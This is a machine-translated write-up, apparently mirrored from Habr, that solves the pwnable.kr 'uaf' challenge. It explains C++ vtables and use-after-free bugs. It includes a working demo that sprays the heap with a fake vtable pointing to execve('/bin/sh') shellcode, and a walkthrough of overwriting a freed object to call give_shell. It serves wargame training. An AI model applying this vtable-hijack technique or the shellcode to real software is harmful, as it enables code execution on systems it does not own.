<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>📢 🏣 😴 pwnable.kr 16でジョブを解決する-uaf。解放後の脆弱性を使用 🏴 👨🏼‍⚕️ 🥋</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="この記事では、UAFとは何かを検討し、サイトpwnable.krから16番目のタスクを解決します。
 
 組織情報 , - , :
 

- PWN;
- (Crypto);
- c (Network);
- (Reverse Engineering);
- (Stegano);
- WEB-.
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>pwnable.kr 16でジョブを解決する-uaf。解放後の脆弱性を使用</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/462471/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="画像"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、UAFとは何かを検討し、サイト</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwnable.kr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">から16番目のタスクを解決します</font><font style="vertical-align: inherit;">。</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">組織情報</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">    </a>.<br>
<cut></cut><br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">継承と仮想メソッド</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
仮想関数-オブジェクト指向プログラミングで、後続のクラスでオーバーライドできるクラス関数。</font><font style="vertical-align: inherit;">したがって、プログラマは仮想メソッドを通じてオブジェクトを操作するためにオブジェクトの正確なタイプを知る必要はありません。オブジェクトがクラスまたはメソッドが宣言されているクラスの子孫に属していることを知っていれば十分です。</font></font><br>
<cut></cut><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
簡単に言えば、仮想関数のスリークを持つ基本クラスAnimalが定義されていると想像してください。</font><font style="vertical-align: inherit;">したがって、Animalクラスには、CatとDogの2つの子クラスを含めることができます。</font><font style="vertical-align: inherit;">仮想関数Cat：sreak（）はmyauを出力し、Dog：sreakはgavを出力します。</font><font style="vertical-align: inherit;">しかし、同じ構造がメモリに格納されている場合、プログラムはどのスリークを呼び出す必要があるかをどのように理解しますか？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
すべての作業は、仮想メソッドのテーブル（TVM）によって提供されるか、vtableによって定義されます。</font></font><br>
<cut></cut><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
各クラスには独自のTVMがあり、コンパイラはこのオブジェクトの最初のローカル変数として仮想テーブルポインタ（vptr-vtableへのポインタ）を追加します。</font><font style="vertical-align: inherit;">確認しよう。</font></font><br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ANIMAL</span>{</span>
	<span class="hljs-keyword">private</span>:
		<span class="hljs-keyword">int</span> var1 = <span class="hljs-number">0x11111111</span>;
	<span class="hljs-keyword">public</span>:
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Animal - func1\n"</span>);<font></font>
		}<font></font>
<font></font>
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Animal - func2\n"</span>);<font></font>
		}<font></font>
};<font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CAT</span> :</span> <span class="hljs-keyword">public</span> ANIMAL {
	<span class="hljs-keyword">public</span>:
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Cat - func1\n"</span>);<font></font>
		}<font></font>
<font></font>
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Cat - func2\n"</span>);<font></font>
		}<font></font>
<font></font>
};<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<font></font>
	ANIMAL *p1 = <span class="hljs-keyword">new</span> ANIMAL();<font></font>
	ANIMAL *p2 = <span class="hljs-keyword">new</span> CAT();<font></font>
	ANIMAL *ptr;<font></font>
<font></font>
	ptr = p1;<font></font>
	ptr-&gt;func1();          <font></font>
	ptr-&gt;func2();  <font></font>
<font></font>
	ptr = <span class="hljs-keyword">dynamic_cast</span>&lt;CAT*&gt;(p2);<font></font>
	ptr-&gt;func1();         <font></font>
	ptr-&gt;func2();        <font></font>
<font></font>
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コンパイルして実行し、出力を確認します。</font></font><br>
<pre><code class="bash hljs">g++ ex.c -o ex.bin</code></pre><br>
<img src="https://habrastorage.org/webt/33/uo/cl/33uoclc85hu4htwgt3gvr-ekdei.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、IDAのデバッガーの下で実行し、最初の関数を呼び出す前に停止します。</font><font style="vertical-align: inherit;">HEX-Viewウィンドウに移動し、RAXレジスタと同期します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rm/cj/ln/rmcjlnazk5l-qvjzi3gbhuhsvdm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
選択したフラグメントでは、ANIMALSおよびCATタイプの変数を定義するときに、変数var1の値が表示されます。</font><font style="vertical-align: inherit;">前述のとおり、両方の変数の前にアドレスがあります。これらはVMTへのポインターです（0x559f9898fd90および0x559f9898fd70）。</font></font><br>
<cut></cut><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
func1が呼び出されたときに何が起こるか見てみましょう：</font></font><br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">まず、RAXでは、ptrポインターを使用してオブジェクトのアドレスを取得します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">さらにRAXでは、オブジェクトの最初の値、つまりVMTへの（最初の要素への）ポインターが読み取られます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RAXでは、VMTからの最初の値（同じ仮想メソッドへのポインター）が読み取られます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RDXでは、オブジェクトへのポインターが入力されます（より一般的にはこれ）。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仮想メソッド呼び出しが行われます。</font></font></li>
</ol><br>
<br>
<img src="https://habrastorage.org/webt/rw/sl/lf/rwsllfoj_r3n_h8pqcz5ez3xdxk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
func2が呼び出されると、同じことが起こりますが、最初のレコード（RAX）ではなく、2番目（RAX + 8）がVMTから読み取られます。</font><font style="vertical-align: inherit;">これは、仮想メソッドを操作するためのメカニズムです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/vu/jp/qa/vujpqaxpie8rg3hwuiewisoswjc.png" alt="画像"><br>
<cut></cut><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UAF</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スタックは少量のデータ（ローカル変数）を格納するように設計されているため、この脆弱性はヒープに典型的です。動的メモリであるヒープは、大量のデータを格納するのに最適です。この場合、プログラムの実行中にメモリの割り当てと解放が発生する可能性があります。ただし、このため、どのメモリが占​​有され、どのメモリが占​​有されていないかを監視する必要があります。これを行うには、割り当てられたメモリブロックのサービスヘッダーが必要です。開始アドレスとブロックの最初の要素へのポインタが含まれています。同時に、スタックとは異なり、ヒープは大きくなります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この脆弱性の本質は、メモリを解放した後、プログラムがこの領域を参照する可能性があることです。したがって、ぶら下がりポインタがあります。プログラムコードを変更し、これを確認します。</font></font><br>
<pre><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<font></font>
	ANIMAL *p1 = <span class="hljs-keyword">new</span> ANIMAL();<font></font>
	ANIMAL *p2 = <span class="hljs-keyword">new</span> CAT();<font></font>
	ANIMAL *ptr;<font></font>
<font></font>
	ptr = p1;<font></font>
	ptr-&gt;func1();          <font></font>
	ptr-&gt;func2();  <font></font>
<font></font>
	ptr = <span class="hljs-keyword">dynamic_cast</span>&lt;CAT*&gt;(p2);<font></font>
	ptr-&gt;func1();         <font></font>
	ptr-&gt;func2();       <font></font>
	<font></font>
	<span class="hljs-keyword">delete</span> p2;<font></font>
	ptr-&gt;func1(); <font></font>
	 <font></font>
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br>
<img src="https://habrastorage.org/webt/cd/wz/d1/cdwzd1qhhkzzjhh9kbrmkith4ci.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムがクラッシュする場所を見つけましょう。前の例と同様に、関数を呼び出す前に停止し、Hex-ViewをRAXと同期します。オブジェクトを配置する場所を確認します。しかし、次の命令を実行すると、RAXレジスタに0が残っており、すでに0を逆参照しようとしているため、プログラムがクラッシュします。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/a5/oy/zx/a5oyzxx4t_i-rf42au3l7ysas3o.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/rk/fj/tk/rkfjtklkfbmcuvukyejfwx8rgti.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、UAFを利用するには、シェルコードをプログラムに転送し、ぶら下げポインタ（VMT内）を介して最初に移動する必要があります。</font><font style="vertical-align: inherit;">これは、ヒープが要求されたときに、以前に解放されたメモリのブロックを割り当てるために可能であり、このようにして、シェルコードを指すVMTをエミュレートできます。</font><font style="vertical-align: inherit;">つまり、VMT関数のアドレスが以前にあった場所に、シェルコードアドレスが配置されるようになります。</font><font style="vertical-align: inherit;">ただし、選択したオブジェクトのみのメモリがクリアされたばかりのゾーンと一致することを保証できないため、そのようなオブジェクトをループ内にいくつか作成します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
例を見てみましょう。</font><font style="vertical-align: inherit;">まず、たとえば</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここから</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">シェルコードを取得</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">します</font></a><font style="vertical-align: inherit;">。</font></font><br>
<pre><code class="cpp hljs"><span class="hljs-string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、私たちのコードを補足してください：</font></font><br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ANIMAL</span>{</span>
	<span class="hljs-keyword">private</span>:
		<span class="hljs-keyword">int</span> var1 = <span class="hljs-number">0x11111111</span>;
	<span class="hljs-keyword">public</span>:
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Animal - func1\n"</span>);<font></font>
		}<font></font>
<font></font>
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Animal - func2\n"</span>);<font></font>
		}<font></font>
};<font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CAT</span> :</span> <span class="hljs-keyword">public</span> ANIMAL {
	<span class="hljs-keyword">public</span>:
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Cat - func1\n"</span>);<font></font>
		}<font></font>
<font></font>
		<span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span>{
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Class Cat - func2\n"</span>);<font></font>
		}<font></font>
<font></font>
};<font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EX_SHELL</span>{</span>
	<span class="hljs-keyword">private</span>:
		<span class="hljs-keyword">char</span> n[<span class="hljs-number">8</span>];
	<span class="hljs-keyword">public</span>:<font></font>
		EX_SHELL(<span class="hljs-keyword">void</span>* addr_in_VMT){
			<span class="hljs-built_in">memcpy</span>(n, &amp;addr_in_VMT, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*));<font></font>
		}<font></font>
};<font></font>
	<font></font>
<font></font>
<span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<font></font>
	ANIMAL *p1 = <span class="hljs-keyword">new</span> ANIMAL();<font></font>
	ANIMAL *p2 = <span class="hljs-keyword">new</span> CAT();<font></font>
	ANIMAL *ptr;<font></font>
<font></font>
	ptr = p1;<font></font>
	ptr-&gt;func1();          <font></font>
	ptr-&gt;func2();  <font></font>
<font></font>
	ptr = <span class="hljs-keyword">dynamic_cast</span>&lt;CAT*&gt;(p2);<font></font>
	ptr-&gt;func1();         <font></font>
	ptr-&gt;func2();       <font></font>
	<font></font>
	<span class="hljs-keyword">delete</span> p2;<font></font>
	<font></font>
	<span class="hljs-keyword">void</span>* vmt[<span class="hljs-number">1</span>];<font></font>
	vmt[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">void</span>*) shellcode;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10000</span>; i++)
		<span class="hljs-keyword">new</span> EX_SHELL(vmt);<font></font>
<font></font>
	ptr-&gt;func1(); <font></font>
	 <font></font>
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コンパイルして実行すると、完全なシェルが作成されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/dn/m8/ez/dnm8ez66kibzhja7bof98xjk3sg.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Uafジョブソリューション</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
uaf署名アイコンをクリックすると、SSHを介してパスワードguestで接続する必要があることが通知されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ai/4r/-q/ai4r-qsnwqswdyzs5ph9uvg1iqs.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接続すると、対応するバナーが表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ne/bx/18/nebx18bv2viitutyrcuckq1mvzy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバー上にあるファイルと、私たちが持っている権利を調べてみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rr/sv/ug/rrsvug_oodh7hlvnzdhwsagfkhe.png" alt="画像"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ソースコードを見てみましょう</font></font></b><div class="spoiler_text"><pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt; </span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Human</span>{</span>
<span class="hljs-keyword">private</span>:
        <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">give_shell</span><span class="hljs-params">()</span></span>{<font></font>
                system(<span class="hljs-string">"/bin/sh"</span>);<font></font>
        }<font></font>
<span class="hljs-keyword">protected</span>:
        <span class="hljs-keyword">int</span> age;
        <span class="hljs-built_in">string</span> name;
<span class="hljs-keyword">public</span>:
        <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">introduce</span><span class="hljs-params">()</span></span>{                                                             
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="hljs-built_in">endl</span>;                                        
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="hljs-string">" years old"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;                               <font></font>
        }                                                                                     <font></font>
};                                                                                            <font></font>
                                                                                              <font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Man</span>:</span> <span class="hljs-keyword">public</span> Human{                                                                      
<span class="hljs-keyword">public</span>:                                                                                       <font></font>
        Man(<span class="hljs-built_in">string</span> name, <span class="hljs-keyword">int</span> age){                                                            
                <span class="hljs-keyword">this</span>-&gt;name = name;                                                            
                <span class="hljs-keyword">this</span>-&gt;age = age;<font></font>
        }<font></font>
        <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">introduce</span><span class="hljs-params">()</span></span>{<font></font>
                Human::introduce();<font></font>
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"I am a nice guy!"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<font></font>
        }<font></font>
};<font></font>
<font></font>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Woman</span>:</span> <span class="hljs-keyword">public</span> Human{
<span class="hljs-keyword">public</span>:<font></font>
        Woman(<span class="hljs-built_in">string</span> name, <span class="hljs-keyword">int</span> age){
                <span class="hljs-keyword">this</span>-&gt;name = name;
                <span class="hljs-keyword">this</span>-&gt;age = age;<font></font>
        }<font></font>
        <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">introduce</span><span class="hljs-params">()</span></span>{<font></font>
                Human::introduce();<font></font>
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"I am a cute girl!"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<font></font>
        }<font></font>
};<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>{<font></font>
        Human* m = <span class="hljs-keyword">new</span> Man(<span class="hljs-string">"Jack"</span>, <span class="hljs-number">25</span>);<font></font>
        Human* w = <span class="hljs-keyword">new</span> Woman(<span class="hljs-string">"Jill"</span>, <span class="hljs-number">21</span>);<font></font>
<font></font>
        <span class="hljs-keyword">size_t</span> len;
        <span class="hljs-keyword">char</span>* data;
        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> op;
        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"1. use\n2. after\n3. free\n"</span>;
                <span class="hljs-built_in">cin</span> &gt;&gt; op;<font></font>
<font></font>
                <span class="hljs-keyword">switch</span>(op){
                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<font></font>
                                m-&gt;introduce();<font></font>
                                w-&gt;introduce();<font></font>
                                <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<font></font>
                                len = atoi(argv[<span class="hljs-number">1</span>]);<font></font>
                                data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[len];<font></font>
                                read(open(argv[<span class="hljs-number">2</span>], O_RDONLY), data, len);
                                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"your data is allocated"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;
                                <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                                <span class="hljs-keyword">delete</span> m;
                                <span class="hljs-keyword">delete</span> w;
                                <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">default</span>:
                                <span class="hljs-keyword">break</span>;<font></font>
                }<font></font>
        }<font></font>
<font></font>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムの最初には、Humanクラスから継承されたクラスの2つのオブジェクトがあります。</font><font style="vertical-align: inherit;">これは私たちにシェルを与える機能を持っています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zt/4a/ep/zt4aeptvx5frrqzll5s-mznrx7y.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、3つのアクションのいずれかを紹介します。</font></font><br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オブジェクト情報を表示します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プログラムパラメータとして受け入れられた一連のデータに書き込む。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作成したオブジェクトを削除します。</font></font></li>
</ol><br>
<br>
<img src="https://habrastorage.org/webt/7p/lk/nq/7plknqpzxgbq4kgoh5dk52ief8y.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このタスクではUAFの脆弱性が考慮されるため、計画は次のようにする必要があります。作成-削除-ヒープへの書き込み-情報の受信。</font></font><br>
<cut></cut><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちが完全に制御できる唯一のステップは、ヒープへの書き込みです。ただし、記録する前に、VMTがこれらのオブジェクトをどのように検索するか、およびシェルを提供する関数のアドレスを知る必要があります。例を使用して、VMTがどのように機能するかを理解しました。アドレスへのポインタは次々と格納されます。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
func2 = * func1 + sizeof（* func1）、func3 = * func1 + 2 * sizeof（* func2）など。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
VMTの最初の関数はgive_shell（）であり、関数Man :: Introduction（）が呼び出されると、VMTの2番目のアドレスがEnterアドレスになります。 64ビットシステムの場合：*導入= * give_shell +8。この確認を見つける：</font></font><br>
<br>
<img src="https://habrastorage.org/webt/uz/3c/-m/uz3c-mkowzsvm9cikvxk58bdf5i.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ベースに対する相対アドレスが8増加するため、メイン+ 272の行は私たちの仮定を証明し</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ie/zd/rd/iezdrduch5fu6njt7_bxf1covra.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/u-/mu/ix/u-muixeafwiucui0zofe97mixii.png" alt="画像"><br>
<br>
<img src="https://habrastorage.org/webt/ms/eu/qr/mseuqrwyfwkh7vwayzo9rl4vql8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ベースアドレス0x0000000000401570が見つかりました。したがって、シェルの代わりに、ヒープにアドレス「give_shell（）」を8減らして書き込む必要があります。これにより、VMTベースとして扱われ、8増加すると、プログラムはシェルを提供します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sf/vg/4x/sfvg4xkane1z-htuaxhj2xo7h5a.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
パラメータとしてのプログラムは、ファイルから読み取るバイト数とファイルの名前です。データを上書きするために少し残っています、解放されたブロックのサイズのメモリブロックを割り当てる必要があります。 1つのオブジェクトを占めるブロックのサイズを見つけます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/dq/cy/zm/dqcyzmps7r9-cduwnzfst-w99g8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、オブジェクトを作成する前に、0x18 = 24バイトが予約されています。つまり、24バイトで構成されるファイルを作成する必要があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/lu/94/k4/lu94k4006vxgturizvruy7ffye0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プログラムは2つのオブジェクトを解放するため、データを2回書き込む必要があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/hv/v4/wihvv4mnb-t_uvgqw25bvxvivmi.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルを取得し、フラグを読み取り、8ポイントを取得します。</font></font><br>
<br>
